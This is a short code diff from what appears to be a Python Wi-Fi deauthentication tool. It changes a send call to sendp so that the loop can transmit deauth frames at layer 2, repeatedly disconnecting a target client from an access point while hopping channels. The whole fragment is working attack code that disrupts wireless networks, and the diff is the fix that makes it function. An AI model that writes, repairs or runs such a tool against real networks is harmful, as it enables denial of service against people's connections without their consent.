@@ -276,7 +276,7 @@ def main_loop():
                while True:
                   if channel.upper() == 'HOP':
                       hop_channel(interface)
-                  send(packet, iface=interface, count=1, verbose=False)
+                  sendp(packet, iface=interface, count=1, verbose=False)
                   if verbose == 'y':
                       print(f"Sent deauth to client: {client_mac}, AP: {ap_mac}, on interface {interface}")
                   time.sleep(0.1) # for our own good
